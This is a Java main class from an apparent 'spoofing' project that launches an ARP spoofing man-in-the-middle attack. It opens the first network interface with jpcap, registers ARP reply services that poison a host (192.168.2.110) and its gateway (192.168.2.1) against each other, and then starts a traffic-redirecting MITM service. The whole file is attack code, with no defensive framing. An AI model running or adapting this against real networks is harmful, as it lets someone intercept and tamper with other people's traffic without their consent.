package org.bitducks.spoofing.main;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.JpcapCaptor;

import org.apache.log4j.BasicConfigurator;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.services.RedirectMITM;
import org.bitducks.spoofing.services.ReplyARPService;

public class MainLED {

	/**
	 * @param args
	 * @throws IOException 
	 * @throws InterruptedException 
	 */
	public static void main(String[] args) throws IOException, InterruptedException {
		//TODO: tester les fucking byte[] et le InetAddress dans un hashmap
		//HashMap<InetAddress, byte[]> ipToMac = new HashMap<InetAddress, byte[]>();
		
		//ipToMac.put(InetAddress.getByName("192.168.2.110"), new byte[]{1,1});
		
		
		// Set up a simple configuration that logs on the console.
		BasicConfigurator.configure();

		Server.createInstance(JpcapCaptor.getDeviceList()[0]);
		Server.getInstance().addService(new ReplyARPService(InetAddress.getByName("192.168.2.110"), InetAddress.getByName("192.168.2.1")));

		Server.getInstance().addService(new ReplyARPService(InetAddress.getByName("192.168.2.1"), InetAddress.getByName("192.168.2.110")));
		
		Server.getInstance().addService(new RedirectMITM());
		Server.getInstance().start();
		Server.getInstance().join();
		Server.getInstance().stopServer();
		
	}

}
